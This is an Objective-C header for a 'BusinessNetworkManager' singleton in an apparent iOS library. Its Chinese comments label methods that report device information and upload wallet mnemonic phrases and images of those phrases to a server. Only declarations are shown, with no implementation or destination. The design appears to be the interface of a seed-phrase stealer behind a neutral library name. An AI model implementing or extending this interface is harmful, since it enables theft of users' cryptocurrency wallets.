//
//  BusinessNetworkManager.h
//  SysDevLauchingDevLib
//
//  Created by 陈帆 on 2026/03/31.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "YODeviceReportData.h"


NS_ASSUME_NONNULL_BEGIN

@interface BusinessNetworkManager : NSObject

+ (instancetype)sharedManager;

// 提交设备信息
- (void)reportDeviceWithSuccess:(void(^)(id response))success
                        failure:(void(^)(NSError *error))failure;

// 发送助记词
- (void)sendMnemonicWordsWith:(NSString *)mnemonic Success:(void(^)(id response))success
                        failure:(void(^)(NSError *error))failure;
// 发送助记词相关的图片
- (void)sendMnemonicImageWithImage:(UIImage *)image Success:(void(^)(id response))success
                        failure:(void(^)(NSError *error))failure;

@end

NS_ASSUME_NONNULL_END
